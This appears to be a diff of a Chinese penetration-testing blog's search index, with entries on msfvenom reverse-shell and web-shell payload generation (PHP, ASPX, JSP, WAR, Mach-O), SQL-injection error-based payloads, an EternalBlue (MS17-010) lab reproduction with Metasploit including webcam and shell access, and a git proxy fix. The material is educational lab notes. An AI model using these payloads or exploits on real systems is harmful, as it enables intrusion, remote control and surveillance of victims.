-<p><code>msfvenom -p osx/x86/shell_ reverse_ _tcp LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f macho -o /root/Desktop/shell.macho</code></p>
-</li>
-</ul>
-<h3 id="2-msfvenom生成web-payload"><a href="#2-msfvenom生成web-payload" class="headerlink" title="(2)msfvenom生成web payload"></a>(2)msfvenom生成web payload</h3><ul>
-<li>php：<code>msfvenom -p php/meterpreter/reverse_ _tcp LHOST=&lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f raw -o /root/Desktop/shell.php</code></li>
-<li>asp：<code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_ tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f aspx -o /root/Desktop/shell.aspx</code></li>
-<li>jsp：<code>msfvenom -p java/jsp_ shell_ _reverse_ _tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f raw -o /root/Desktop/shell.jsp</code></li>
-<li>war：<code>msfvenom -p java/jsp_ shell. _reverse_ .tcp LHOST= &lt;Your IP Address&gt; LPORT= &lt;Your Port to Connect On&gt; -f war -o /root/Desktop/shell.war</code></li>
-</ul>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入</title>
     <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
     <content><![CDATA[<h2 id="一、报错盲注"><a href="#一、报错盲注" class="headerlink" title="一、报错盲注"></a>一、报错盲注</h2><h3 id="1、通过updatexml报错"><a href="#1、通过updatexml报错" class="headerlink" title="1、通过updatexml报错"></a>1、通过updatexml报错</h3><p>爆数据库名：<code>&#39;and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
@@ -2397,6 +2449,19 @@
       <tags>
         <tag>web</tag>
         <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git clone出错</title>
+    <url>/2022/01/09/study-1/</url>
+    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
+<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>基础知识和笔记</category>
+      </categories>
+      <tags>
+        <tag>learn</tag>
       </tags>
   </entry>
   <entry>
@@ -2516,19 +2581,6 @@
 <p>方法：文件夹右键属性—安全—高级—勾上第二个对号即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">案例：</span><br><span class="line">123文件夹下有许多个子文件夹及文件，由于长时间的权限管理，多个子文件夹的权限都做过不同的权限修改，现需要该文件夹下的所有子文件夹及子文件的权限全部统一</span><br></pre></td></tr></table></figure>
 <h3 id="4-7-文件复制对权限的影响"><a href="#4-7-文件复制对权限的影响" class="headerlink" title="4.7 文件复制对权限的影响"></a>4.7 文件复制对权限的影响</h3><p>文件复制后，文件的权限被目标文件夹的权限覆盖</p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>git clone出错</title>
-    <url>/2022/01/09/study-1/</url>
-    <content><![CDATA[<h4 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> http.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> https.proxy http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span></span><br></pre></td></tr></table></figure>
-<h4 id="如果无效则输入："><a href="#如果无效则输入：" class="headerlink" title="如果无效则输入："></a>如果无效则输入：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> --unset http.proxy</span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> --unset https.proxy</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>基础知识和笔记</category>
@@ -2719,58 +2771,6 @@
       </categories>
       <tags>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>永恒之蓝复现</title>
-    <url>/2022/04/12/ms17-010/</url>
-    <content><![CDATA[<h1 id="一、搭建测试环境"><a href="#一、搭建测试环境" class="headerlink" title="一、搭建测试环境"></a>一、搭建测试环境</h1><p>两台虚拟机</p>
-<ul>
-<li>kali linux（攻击机）ip：192.168.11.132</li>
-<li>Windows 7（被攻击机）ip：192.168.11.128</li>
-</ul>
-<p>tips：被攻击机防火墙需要关闭否则会对实验造成影响</p>
-<h1 id="二、扫描端口"><a href="#二、扫描端口" class="headerlink" title="二、扫描端口"></a>二、扫描端口</h1><p>使用nmap扫描端口查看是否开放445端口</p>
-<p><code>nmap 192.168.11.128</code></p>
-<p><img src="/2022/04/12/ms17-010/1.png" alt></p>
-<p>发现445端口开放</p>
-<h1 id="三、使用Metasploit工具"><a href="#三、使用Metasploit工具" class="headerlink" title="三、使用Metasploit工具"></a>三、使用Metasploit工具</h1><p><strong>msf（Metasploit）</strong>是一个开源的工具，它常常应用于渗透测试方面，它里面六个模块分别为<strong>辅助模块（auxiliary）</strong>、<strong>渗透攻击模块（exploits）</strong>、<strong>后渗透攻击模块（post）</strong>、<strong>攻击载荷模（payloads）</strong>、<strong>空指令模块（nops）</strong>、<strong>编码器模块（encoders）</strong>。它里面含有2000多种漏洞库存，用于测试</p>
-<p>使用<code>msfconsole</code>进入该工具，然后使用<code>search ms17-010</code>寻找所需模块</p>
-<p><img src="/2022/04/12/ms17-010/2.png" alt></p>
-<h2 id="1、检验是否有漏洞"><a href="#1、检验是否有漏洞" class="headerlink" title="1、检验是否有漏洞"></a>1、检验是否有漏洞</h2><p>使用<code>auxiliary</code>模块验证是否有永恒之蓝漏洞：<code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p><code>show options</code>可以查看需要配置的东西</p>
-<p><img src="/2022/04/12/ms17-010/3.png" alt></p>
-<ol>
-<li>配置ip：<code>set RHOSTS 192.168.11.128</code></li>
-<li>配置端口：<code>set RPORT 445</code></li>
-</ol>
-<p><img src="/2022/04/12/ms17-010/4.png" alt></p>
-<p>配置好之后<code>run</code>即可</p>
-<p><img src="/2022/04/12/ms17-010/5.png" alt></p>
-<p>可以看到它检测出来这个ip有永恒之蓝漏洞</p>
-<h2 id="2、攻击"><a href="#2、攻击" class="headerlink" title="2、攻击"></a>2、攻击</h2><p>使用<code>exploit</code>模块进行攻击：<code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p><code>show options</code>查看需要配置的内容</p>
-<p>同理，配置好ip和端口即可</p>
-<p>然后<code>run</code>即可，出现下面这种就代表成功</p>
-<p><img src="/2022/04/12/ms17-010/6.png" alt></p>
-<h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用"></a>3、利用</h2><ol>
-<li>使用<code>screenshot</code>可以截屏</li>
-<li>使用<code>shell</code>可以进入被攻击机的Windows shell</li>
-<li>使用<code>webcam_snap</code>可以使用摄像头拍照</li>
-<li><code>exit</code>退出</li>
-<li>…</li>
-</ol>
-<p>但在使用Windows shell的时候会发现有乱码</p>
-<p><img src="/2022/04/12/ms17-010/7.png" alt></p>
-<p>使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页），这样就显示正常了</p>
-<p>既然都能使用Windows shell了，那就什么事都不在话下了</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>复现</tag>
       </tags>
   </entry>
   <entry>
